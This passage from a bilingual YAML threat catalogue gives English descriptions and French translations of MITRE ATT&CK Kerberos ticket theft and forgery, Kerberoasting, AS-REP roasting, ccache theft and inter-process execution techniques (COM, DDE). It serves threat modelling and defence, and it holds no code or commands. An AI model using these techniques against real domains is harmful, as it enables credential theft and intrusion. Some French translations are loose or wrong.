          \ [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos\
          \ est un protocole d\u2019authentification largement utilis\xE9 dans les\
          \ environnements de domaine Windows modernes. Dans les environnements Kerberos,\
          \ appel\xE9s \xAB realms \xBB, il y a trois participants de base : client,\
          \ service et Centre de distribution de cl\xE9s (KDC). (Citation : D\xE9\
          codeur d\u2019anneaux Kerberos ADSecurity) Les clients demandent l\u2019\
          acc\xE8s \xE0 un service et, via l\u2019\xE9change de tickets Kerberos,\
          \ provenant de KDC, ils obtiennent l\u2019acc\xE8s apr\xE8s avoir r\xE9\
          ussi l\u2019authentification. Le KDC est responsable \xE0 la fois de l\u2019\
          authentification et de l\u2019attribution des tickets.  Les adversaires\
          \ peuvent tenter d\u2019abuser de Kerberos en volant des tickets ou en forgeant\
          \ des tickets pour permettre un acc\xE8s non autoris\xE9.\n\nSous Windows,\
          \ l\u2019utilitaire <code>int\xE9gr\xE9 klist</code> peut \xEAtre utilis\xE9\
          \ pour lister et analyser les tickets Kerberos mis en cache. (Citation :\
          \ Microsoft Klist)\nhttps://attack.mitre.org/techniques/T1558"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558.001
    ref_id: T1558.001
    name: Golden Ticket
    description: "Adversaries who have the KRBTGT account password hash may forge\
      \ Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation:\
      \ AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate\
      \ authentication material for any account in Active Directory.(Citation: CERT-EU\
      \ Golden Ticket Protection) \n\nUsing a golden ticket, adversaries are then\
      \ able to request ticket granting service (TGS) tickets, which enable access\
      \ to specific resources. Golden tickets require adversaries to interact with\
      \ the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity\
      \ Detecting Forged Tickets)\n\nThe KDC service runs all on domain controllers\
      \ that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution\
      \ Center (KDC) service account and is responsible for encrypting and signing\
      \ all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT\
      \ password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)\
      \ and privileged access to a domain controller.\nhttps://attack.mitre.org/techniques/T1558/001"
    translations:
      fr:
        name: "Ticket d\u2019or"
        description: "Les adversaires qui poss\xE8dent le hachage du mot de passe\
          \ du compte KRBTGT peuvent falsifier les tickets d\u2019attribution des\
          \ tickets Kerberos (TGT), \xE9galement appel\xE9s billets d\u2019or. (Citation\
          \ : AdSecurity Kerberos GT ao\xFBt 2015) Les Golden Tickets permettent aux\
          \ adversaires de g\xE9n\xE9rer du mat\xE9riel d\u2019authentification pour\
          \ n\u2019importe quel compte dans Active Directory. (Citation : Protection\
          \ du Ticket d\u2019Or CERT-UE) \n\nGr\xE2ce \xE0 un ticket d\u2019or, les\
          \ adversaires peuvent alors demander des tickets de service d\u2019octroi\
          \ de billets (TGS), qui permettent d\u2019acc\xE9der \xE0 des ressources\
          \ sp\xE9cifiques. Les Golden Tickets exigent que les adversaires interagissent\
          \ avec le Key Distribution Center (KDC) afin d\u2019obtenir le TGS. (Citation\
          \ : D\xE9tection de la S\xE9curit\xE9 des Tickets Falsifi\xE9s)\n\nLe service\
          \ KDC fonctionne enti\xE8rement sur des contr\xF4leurs de domaine faisant\
          \ partie d\u2019un domaine Active Directory. KRBTGT est le compte de service\
          \ du Centre de Distribution de Cl\xE9s Kerberos (KDC) et est responsable\
          \ du chiffrement et de la signature de tous les tickets Kerberos. (Citation\
          \ : ADSecurity Kerberos et KRBTGT) Le hachage du mot de passe KRBTGT peut\
          \ \xEAtre obtenu via [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)\
          \ et un acc\xE8s privil\xE9gi\xE9 \xE0 un contr\xF4leur de domaine.\nhttps://attack.mitre.org/techniques/T1558/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558.002
    ref_id: T1558.002
    name: Silver Ticket
    description: 'Adversaries who have the password hash of a target service account
      (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets,
      also known as silver tickets. Kerberos TGS tickets are also known as service
      tickets.(Citation: ADSecurity Silver Tickets)


      Silver tickets are more limited in scope in than golden tickets in that they
      only enable adversaries to access a particular resource (e.g. MSSQL) and the
      system that hosts the resource; however, unlike golden tickets, adversaries
      with the ability to forge silver tickets are able to create TGS tickets without
      interacting with the Key Distribution Center (KDC), potentially making detection
      more difficult.(Citation: ADSecurity Detecting Forged Tickets)


      Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
      or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).

      https://attack.mitre.org/techniques/T1558/002'
    translations:
      fr:
        name: "Billet d\u2019argent"
        description: "Les adversaires qui poss\xE8dent le hachage du mot de passe\
          \ d\u2019un compte de service cible (par exemple SharePoint, MSSQL) peuvent\
          \ falsifier des tickets de service d\u2019octroi de tickets Kerberos (TGS),\
          \ \xE9galement appel\xE9s billets argent. Les billets TGS de Kerberos sont\
          \ \xE9galement appel\xE9s tickets de service. (Citation : Billets Argent\
          \ ADSecurity)\n\nLes tickets argent sont plus limit\xE9s que les billets\
          \ d\u2019or dans la mesure o\xF9 ils ne permettent aux adversaires d\u2019\
          acc\xE9der qu\u2019\xE0 une ressource particuli\xE8re (par exemple MSSQL)\
          \ et au syst\xE8me qui h\xE9berge la ressource ; cependant, contrairement\
          \ aux billets dor\xE9s, les adversaires capables de falsifier des billets\
          \ argent peuvent cr\xE9er des tickets TGS sans interagir avec le Centre\
          \ de Distribution des Cl\xE9s (KDC), ce qui rend la d\xE9tection potentiellement\
          \ plus difficile. (Citation : D\xE9tection de la S\xE9curit\xE9 des Tickets\
          \ Falsifi\xE9s)\n\nLes hachages de mots de passe pour les services cibles\
          \ peuvent \xEAtre obtenus via [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)\
          \ ou [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).\nhttps://attack.mitre.org/techniques/T1558/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558.003
    ref_id: T1558.003
    name: Kerberoasting
    description: "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT)\
      \ or sniff network traffic to obtain a ticket-granting service (TGS) ticket\
      \ that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation:\
      \ Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec\
      \ 2015) \n\nService principal names (SPNs) are used to uniquely identify each\
      \ instance of a Windows service. To enable authentication, Kerberos requires\
      \ that SPNs be associated with at least one service logon account (an account\
      \ specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting\
      \ Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation:\
      \ SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\
      \nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request\
      \ one or more Kerberos ticket-granting service (TGS) service tickets for any\
      \ SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation:\
      \ AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted\
      \ with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the\
      \ service account associated with the SPN is used as the private key and is\
      \ thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110)\
      \ attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking\
      \ Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation:\
      \ Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using\
      \ service tickets captured from network traffic.(Citation: AdSecurity Cracking\
      \ Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003),\
      \ [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral\
      \ Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation:\
      \ SANS Attacking Kerberos Nov 2014)\nhttps://attack.mitre.org/techniques/T1558/003"
    translations:
      fr:
        name: Kerberoasting
        description: "Les adversaires peuvent abuser d\u2019un ticket d\u2019octroi\
          \ de billets (TGT) valide de Kerberos ou de d\xE9tecter le trafic r\xE9\
          seau pour obtenir un ticket de service d\u2019octroi de tickets (TGS) qui\
          \ pourrait \xEAtre vuln\xE9rable \xE0 la [Brute Force](https://attack.mitre.org/techniques/T1110).\
          \ (Citation : Empire InvokeKerberoast oct. 2016)(Citation : AdSecurity cassant\
          \ Kerberos d\xE9c. 2015) \n\nLes noms du principal de service (SPN) sont\
          \ utilis\xE9s pour identifier de mani\xE8re unique chaque instance d\u2019\
          un service Windows. Pour permettre l\u2019authentification, Kerberos exige\
          \ que les SPN soient associ\xE9s \xE0 au moins un compte de connexion de\
          \ service (un compte sp\xE9cifiquement charg\xE9 d\u2019ex\xE9cuter un service\
          \ (Citation : Microsoft Detecting Kerberoasting f\xE9v 2018)). (Citation\
          \ : Microsoft SPN)(Citation : Microsoft SetSPN)(Citation : SANS attaquant\
          \ Kerberos nov. 2014)(Citation : Harmj0y Kerberoast nov. 2016)\n\nLes adversaires\
          \ poss\xE9dant un ticket d\u2019octroi de tickets (TGT) valide peuvent demander\
          \ un ou plusieurs tickets de service d\u2019octroi de tickets Kerberos (TGS)\
          \ pour tout SPN aupr\xE8s d\u2019un contr\xF4leur de domaine (DC). (Citation\
          \ : Empire InvokeKerberoast oct. 2016)(Citation : AdSecurity cassant Kerberos\
          \ d\xE9c. 2015) Certaines parties de ces tickets peuvent \xEAtre chiffr\xE9\
          es avec l\u2019algorithme RC4, ce qui signifie que le hachage Kerberos 5\
          \ TGS-REP etype 23 du compte de service associ\xE9 au SPN est utilis\xE9\
          \ comme cl\xE9 priv\xE9e et est donc vuln\xE9rable aux attaques hors ligne\
          \ [Brute Force](https://attack.mitre.org/techniques/T1110) qui peuvent exposer\
          \ des identifiants en clair. (Citation : AdSecurity cassant Kerberos d\xE9\
          c. 2015)(Citation : Empire InvokeKerberoast oct. 2016) (Citation : Harmj0y\
          \ Kerberoast nov. 2016)\n\nCe m\xEAme comportement pouvait \xEAtre ex\xE9\
          cut\xE9 \xE0 l\u2019aide de tickets de service captur\xE9s \xE0 partir du\
          \ trafic r\xE9seau. (Citation : AdSecurity cassant Kerberos d\xE9c. 2015)\n\
          \nLes hachages craqu\xE9s peuvent permettre la [Persistance](https://attack.mitre.org/tactics/TA0003),\
          \ [Escalade de privil\xE8ges](https://attack.mitre.org/tactics/TA0004) et\
          \ [Mouvement lat\xE9ral](https://attack.mitre.org/tactics/TA0008) via l\u2019\
          acc\xE8s \xE0 [Comptes valides](https://attack.mitre.org/techniques/T1078).\
          \ (Citation : SANS attaquant Kerberos nov. 2014)\nhttps://attack.mitre.org/techniques/T1558/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558.004
    ref_id: T1558.004
    name: AS-REP Roasting
    description: "Adversaries may reveal credentials of accounts that have disabled\
      \ Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002)\
      \ Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication\
      \ offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002).\
      \ When enabled, a user requesting access to a resource initiates communication\
      \ with the Domain Controller (DC) by sending an Authentication Server Request\
      \ (AS-REQ) message with a timestamp that is encrypted with the hash of their\
      \ password. If and only if the DC is able to successfully decrypt the timestamp\
      \ with the hash of the user\u2019s password, it will then send an Authentication\
      \ Server Response (AS-REP) message that contains the Ticket Granting Ticket\
      \ (TGT) to the user. Part of the AS-REP message is signed with the user\u2019\
      s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found\
      \ without preauthentication, an adversary may send an AS-REQ message without\
      \ the encrypted timestamp and receive an AS-REP message with TGT data which\
      \ may be encrypted with an insecure algorithm such as RC4. The recovered encrypted\
      \ data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002)\
      \ attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003)\
      \ and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan\
      \ 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account\
      \ registered to a domain, with or without special privileges, can be abused\
      \ to list all domain accounts that have preauthentication disabled by utilizing\
      \ Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ with an LDAP filter. Alternatively, the adversary may send an AS-REQ message\
      \ for each user. If the DC responds without errors, the account does not require\
      \ preauthentication and the AS-REP message will already contain the encrypted\
      \ data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits\
      \ Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003),\
      \ [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral\
      \ Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation:\
      \ SANS Attacking Kerberos Nov 2014)\nhttps://attack.mitre.org/techniques/T1558/004"
    translations:
      fr:
        name: "Torr\xE9faction AS-REP"
        description: "Les adversaires peuvent r\xE9v\xE9ler les identifiants des comptes\
          \ ayant d\xE9sactiv\xE9 la pr\xE9authentification Kerberos par les messages\
          \ Kerberos [Password Cracking](https://attack.mitre.org/techniques/T1110/002).\
          \ (Citation : Harmj0y Roasting AS-REPs janv. 2017) \n\nLa pr\xE9authentification\
          \ offre une protection contre le [Password Cracking](https://attack.mitre.org/techniques/T1110/002).\
          \ Lorsqu\u2019activ\xE9, un utilisateur demandant l\u2019acc\xE8s \xE0 une\
          \ ressource initie la communication avec le Contr\xF4leur de Domaine (DC)\
          \ en envoyant un message de demande de serveur d\u2019authentification (AS-REQ)\
          \ avec un horodatage chiffr\xE9 avec le hachage de son mot de passe. Si\
          \ et seulement si le DC parvient \xE0 d\xE9chiffrer avec succ\xE8s l\u2019\
          horodatage avec le hachage du mot de passe de l\u2019utilisateur, il enverra\
          \ alors un message de r\xE9ponse serveur d\u2019authentification (AS-REP)\
          \ contenant le ticket d\u2019octroi de billets (TGT) \xE0 l\u2019utilisateur.\
          \ Une partie du message AS-REP est sign\xE9e avec le mot de passe de l\u2019\
          utilisateur. (Citation : Microsoft Kerberos Preauth 2014)\n\nPour chaque\
          \ compte trouv\xE9 sans pr\xE9authentification, un adversaire peut envoyer\
          \ un message AS-REQ sans l\u2019horodatage chiffr\xE9 et recevoir un message\
          \ AS-REP avec des donn\xE9es TGT qui peuvent \xEAtre chiffr\xE9es avec un\
          \ algorithme non s\xE9curis\xE9 tel que RC4. Les donn\xE9es chiffr\xE9es\
          \ r\xE9cup\xE9r\xE9es peuvent \xEAtre vuln\xE9rables \xE0 des attaques hors\
          \ ligne de [Password Cracking](https://attack.mitre.org/techniques/T1110/002)\
          \ similaires \xE0 [Kerberoasting](https://attack.mitre.org/techniques/T1558/003)\
          \ et exposer des identifiants en clair. (Citation : Harmj0y Roasting AS-REPs\
          \ janv. 2017)(Citation : Stealthbits crack AS-REP Roasting juin 2019) \n\
          \nUn compte enregistr\xE9 sur un domaine, avec ou sans privil\xE8ges sp\xE9\
          ciaux, peut \xEAtre abus\xE9 pour lister tous les comptes de domaine dont\
          \ la pr\xE9authentification est d\xE9sactiv\xE9e en utilisant des outils\
          \ Windows comme [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ avec un filtre LDAP. Alternativement, l\u2019adversaire peut envoyer un\
          \ message AS-REQ pour chaque utilisateur. Si le DC r\xE9pond sans erreurs,\
          \ le compte ne n\xE9cessite pas de pr\xE9authentification et le message\
          \ AS-REP contiendra d\xE9j\xE0 les donn\xE9es chiffr\xE9es. (Citation :\
          \ Harmj0y Roasting AS-REPs janv. 2017)(Citation : Stealthbits crack AS-REP\
          \ Roasting juin 2019)\n\nLes hachages craqu\xE9s peuvent permettre la [Persistance](https://attack.mitre.org/tactics/TA0003),\
          \ [Escalade de privil\xE8ges](https://attack.mitre.org/tactics/TA0004) et\
          \ [Mouvement lat\xE9ral](https://attack.mitre.org/tactics/TA0008) via l\u2019\
          acc\xE8s \xE0 [Comptes valides](https://attack.mitre.org/techniques/T1078).\
          \ (Citation : SANS attaquant Kerberos nov. 2014)\nhttps://attack.mitre.org/techniques/T1558/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558.005
    ref_id: T1558.005
    name: Ccache Files
    description: "Adversaries may attempt to steal Kerberos tickets stored in credential\
      \ cache files (or ccache). These files are used for short term storage of a\
      \ user's active session credentials. The ccache file is created upon user authentication\
      \ and allows for access to multiple services without the user having to re-enter\
      \ credentials. \n\nThe <code>/etc/krb5.conf</code> configuration file and the\
      \ <code>KRB5CCNAME</code> environment variable are used to set the storage location\
      \ for ccache entries. On Linux, credentials are typically stored in the `/tmp`\
      \ directory with a naming format of `krb5cc_%UID%` or `krb5.ccache`. On macOS,\
      \ ccache entries are stored by default in memory with an `API:{uuid}` naming\
      \ scheme. Typically, users interact with ticket storage using <code>kinit</code>,\
      \ which obtains a Ticket-Granting-Ticket (TGT) for the principal; <code>klist</code>,\
      \ which lists obtained tickets currently held in the credentials cache; and\
      \ other built-in binaries.(Citation: Kerberos GNU/Linux)(Citation: Binary Defense\
      \ Kerberos Linux)\n\nAdversaries can collect tickets from ccache files stored\
      \ on disk and authenticate as the current user without their password to perform\
      \ [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.\
      \ Adversaries can also use these tickets to impersonate legitimate users with\
      \ elevated privileges to perform [Privilege Escalation](https://attack.mitre.org/tactics/TA0004).\
      \ Tools like Kekeo can also be used by adversaries to convert ccache files to\
      \ Windows format for further [Lateral Movement](https://attack.mitre.org/tactics/TA0008).\
      \ On macOS, adversaries may use open-source tools or the Kerberos framework\
      \ to interact with ccache files and extract TGTs or Service Tickets via lower-level\
      \ APIs.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: Linux Kerberos\
      \ Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\nhttps://attack.mitre.org/techniques/T1558/005"
    translations:
      fr:
        name: Fichiers Ccache
        description: "Les adversaires peuvent tenter de voler des tickets Kerberos\
          \ stock\xE9s dans des fichiers cache d\u2019identifiants (ou ccache). Ces\
          \ fichiers sont utilis\xE9s pour le stockage \xE0 court terme des identifiants\
          \ de session active d\u2019un utilisateur. Le fichier ccache est cr\xE9\xE9\
          \ lors de l\u2019authentification de l\u2019utilisateur et permet d\u2019\
          acc\xE9der \xE0 plusieurs services sans que l\u2019utilisateur ait \xE0\
          \ saisir \xE0 nouveau ses identifiants. \n\nLe fichier <code>de configuration\
          \ /etc/krb5.conf</code> et la variable <code>d\u2019environnement KRB5CCNAME</code>\
          \ sont utilis\xE9s pour d\xE9finir l\u2019emplacement de stockage des entr\xE9\
          es ccache. Sous Linux, les identifiants sont g\xE9n\xE9ralement stock\xE9\
          s dans le r\xE9pertoire '/tmp' avec un format de nom 'krb5cc_\_%UID\_%'\
          \ ou 'krb5.ccache'. Sur macOS, les entr\xE9es ccache sont stock\xE9es par\
          \ d\xE9faut en m\xE9moire avec un sch\xE9ma de nommage 'API\_:{uuid}'. En\
          \ g\xE9n\xE9ral, les utilisateurs interagissent avec le stockage des tickets\
          \ en utilisant <code>kinit</code>, qui obtient un Ticket-Granting-Ticket\
          \ (TGT) pour le principal ; <code>klist</code>, qui liste les tickets obtenus\
          \ actuellement d\xE9tenus dans la cache des identifiants ; et d\u2019autres\
          \ binaires int\xE9gr\xE9s. (Citation : Kerberos GNU/Linux)(Citation : D\xE9\
          fense binaire Kerberos Linux)\n\nLes adversaires peuvent collecter des tickets\
          \ \xE0 partir de fichiers ccache stock\xE9s sur le disque et s\u2019authentifier\
          \ en tant qu\u2019utilisateur actuel sans son mot de passe pour effectuer\
          \ des attaques [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003).\
          \ Les adversaires peuvent \xE9galement utiliser ces tickets pour se faire\
          \ passer pour des utilisateurs l\xE9gitimes avec des privil\xE8ges \xE9\
          lev\xE9s afin d\u2019effectuer une [Escalade de privil\xE8ges](https://attack.mitre.org/tactics/TA0004).\
          \ Des outils comme Kekeo peuvent aussi \xEAtre utilis\xE9s par des adversaires\
          \ pour convertir des fichiers ccache au format Windows afin de favoriser\
          \ un [Mouvement lat\xE9ral](https://attack.mitre.org/tactics/TA0008). Sur\
          \ macOS, les adversaires peuvent utiliser des outils open source ou le framework\
          \ Kerberos pour interagir avec des fichiers ccache et extraire des TGT ou\
          \ des tickets de service via des API de bas niveau. (Citation : SpectorOps\
          \ Bifrost Kerberos macOS 2019)(Citation : Tickets Linux Kerberos)(Citation\
          \ : Apporter MimiKatz \xE0 Unix)(Citation : Kekeo)\nhttps://attack.mitre.org/techniques/T1558/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1559
    ref_id: T1559
    name: Inter-Process Communication
    description: "Adversaries may abuse inter-process communication (IPC) mechanisms\
      \ for local code or command execution. IPC is typically used by processes to\
      \ share data, communicate with each other, or synchronize execution. IPC is\
      \ also commonly used to avoid situations such as deadlocks, which occurs when\
      \ processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse\
      \ IPC to execute arbitrary code or commands. IPC mechanisms may differ depending\
      \ on OS, but typically exists in a form accessible through programming languages/libraries\
      \ or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002)\
      \ or [Component Object Model](https://attack.mitre.org/techniques/T1559/001).\
      \ Linux environments support several different IPC mechanisms, two of which\
      \ being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums,\
      \ such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s,\
      \ may also leverage underlying IPC mechanisms. Adversaries may also use [Remote\
      \ Services](https://attack.mitre.org/techniques/T1021) such as [Distributed\
      \ Component Object Model](https://attack.mitre.org/techniques/T1021/003) to\
      \ facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)"
    translations:
      fr:
        name: Communication inter-processus
        description: "Les adversaires peuvent abuser des m\xE9canismes de communication\
          \ inter-processus (IPC) pour l\u2019ex\xE9cution locale de code ou de commandes.\
          \ L\u2019IPC est g\xE9n\xE9ralement utilis\xE9 par les processus pour partager\
          \ des donn\xE9es, communiquer entre eux ou synchroniser l\u2019ex\xE9cution.\
          \ La CPI est \xE9galement couramment utilis\xE9e pour \xE9viter des situations\
          \ telles que les blocages, qui surviennent lorsque les processus sont bloqu\xE9\
          s dans un sch\xE9ma d\u2019attente cyclique. \n\nLes adversaires peuvent\
          \ abuser de l\u2019IPC pour ex\xE9cuter un code ou des commandes arbitraires.\
          \ Les m\xE9canismes IPC peuvent varier selon le syst\xE8me d\u2019exploitation,\
          \ mais existent g\xE9n\xE9ralement sous une forme accessible via des langages\
          \ de programmation/biblioth\xE8ques ou des interfaces natives telles que\
          \ Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002)\
          \ ou [Component Object Model](https://attack.mitre.org/techniques/T1559/001).\
          \ Les environnements Linux prennent en charge plusieurs m\xE9canismes IPC\
          \ diff\xE9rents, dont deux sont des sockets et des pipes. (Citation : IPC\
          \ Linux) Les supports d\u2019ex\xE9cution de niveau sup\xE9rieur, tels que\
          \ ceux des [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059),\
          \ peuvent \xE9galement exploiter les m\xE9canismes IPC sous-jacents. Les\
          \ adversaires peuvent \xE9galement utiliser [Services distants](https://attack.mitre.org/techniques/T1021)\
          \ tels que [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)\
          \ pour faciliter l\u2019ex\xE9cution IPC \xE0 distance. (Citation : Fireeye\
          \ Hunting COM juin 2019)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1559.001
    ref_id: T1559.001
    name: Component Object Model
    description: 'Adversaries may use the Windows Component Object Model (COM) for
      local code execution. COM is an inter-process communication (IPC) component
      of the native Windows application programming interface (API) that enables interaction
      between software objects, or executable code that implements one or more interfaces.(Citation:
      Fireeye Hunting COM June 2019) Through COM, a client object can call methods
      of server objects, which are typically binary Dynamic Link Libraries (DLL) or
      executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated
      by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed
      Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation:
      Fireeye Hunting COM June 2019)


      Various COM interfaces are exposed that can be abused to invoke arbitrary execution
      via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation:
      Microsoft COM) Specific COM objects also exist to directly perform functions
      beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053),
      fileless download/execution, and other adversary behaviors related to privilege
      escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation:
      ProjectZero File Write EoP Apr 2018)

      https://attack.mitre.org/techniques/T1559/001'
    translations:
      fr:
        name: "Mod\xE8le d\u2019objet composant"
        description: "Les adversaires peuvent utiliser le Windows Component Object\
          \ Model (COM) pour l\u2019ex\xE9cution locale du code. COM est un composant\
          \ de communication inter-processus (IPC) de l\u2019interface native de programmation\
          \ d\u2019applications Windows (API) qui permet l\u2019interaction entre\
          \ des objets logiciels, ou du code ex\xE9cutable impl\xE9mentant une ou\
          \ plusieurs interfaces. (Citation : Fireeye Hunting COM juin 2019) Via COM,\
          \ un objet client peut appeler des m\xE9thodes d\u2019objets serveur, qui\
          \ sont g\xE9n\xE9ralement des biblioth\xE8ques de liaison dynamique binaire\
          \ (DLL) ou des ex\xE9cutables (EXE). (Citation : Microsoft COM) L\u2019\
          ex\xE9cution \xE0 distance du COM est facilit\xE9e par des [Services distants](https://attack.mitre.org/techniques/T1021)\
          \ tels que [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)\
          \ (DCOM). (Citation : Fireeye Hunting COM juin 2019)\n\nDiverses interfaces\
          \ COM sont expos\xE9es et peuvent \xEAtre abus\xE9es pour invoquer une ex\xE9\
          cution arbitraire via divers langages de programmation tels que C, C++,\
          \ Java et [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\
          \ (Citation : Microsoft COM) Des objets COM sp\xE9cifiques existent \xE9\
          galement pour effectuer directement des fonctions au-del\xE0 de l\u2019\
          ex\xE9cution du code, telles que la cr\xE9ation d\u2019une [t\xE2che/t\xE2\
          che planifi\xE9e](https://attack.mitre.org/techniques/T1053), le t\xE9l\xE9\
          chargement/ex\xE9cution sans fichiers, et d\u2019autres comportements adverses\
          \ li\xE9s \xE0 l\u2019escalade et \xE0 la persistance des privil\xE8ges.\
          \ (Citation : Fireeye Hunting COM juin 2019)(Citation : Fichier ProjectZero\
          \ \xC9crit EoP avril 2018)\nhttps://attack.mitre.org/techniques/T1559/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1559.002
    ref_id: T1559.002
    name: Dynamic Data Exchange
    description: 'Adversaries may use Windows Dynamic Data Exchange (DDE) to execute
      arbitrary commands. DDE is a client-server protocol for one-time and/or continuous
      inter-process communication (IPC) between applications. Once a link is established,
      applications can autonomously exchange transactions consisting of strings, warm
      data links (notifications when a data item changes), hot data links (duplications
      of changes to a data item), and requests for command execution.


      Object Linking and Embedding (OLE), or the ability to link data between documents,
      was originally implemented through DDE. Despite being superseded by [Component
      Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled
      in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation:
      BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021
      Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)


      Microsoft Office documents can be poisoned with DDE commands, directly or through
      embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566)
      campaigns or hosted Web content, avoiding the use of Visual Basic for Applications
      (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE
      Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess
      DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications
      and/or commands on a victim device by way of embedding DDE formulas within a
      CSV file intended to be opened through a Windows spreadsheet program.(Citation:
      OWASP CSV Injection)(Citation: CSV Excel Macro Injection )


      DDE could also be leveraged by an adversary operating on a compromised machine
      who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).
      DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021)
      such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)
      (DCOM).(Citation: Fireeye Hunting COM June 2019)

      https://attack.mitre.org/techniques/T1559/002'
    translations:
      fr:
        name: "\xC9change dynamique de donn\xE9es"
        description: "Les adversaires peuvent utiliser Windows Dynamic Data Exchange\
          \ (DDE) pour ex\xE9cuter des commandes arbitraires. DDE est un protocole\
          \ client-serveur pour la communication inter-processus (IPC) unique et/ou\
          \ continue entre applications. Une fois un lien \xE9tabli, les applications\
          \ peuvent \xE9changer de mani\xE8re autonome des transactions compos\xE9\
          es de cha\xEEnes de caract\xE8res, de liens de donn\xE9es chauds (notifications\
          \ lorsqu\u2019un \xE9l\xE9ment de donn\xE9es change), de liens de donn\xE9\
          es chauds (duplications de modifications d\u2019un \xE9l\xE9ment de donn\xE9\
          es) et de demandes d\u2019ex\xE9cution de commandes.\n\nLa liaison et l\u2019\
          int\xE9gration d\u2019objets (OLE), ou la capacit\xE9 de lier des donn\xE9\
          es entre documents, a \xE9t\xE9 initialement mise en \u0153uvre via DDE.\
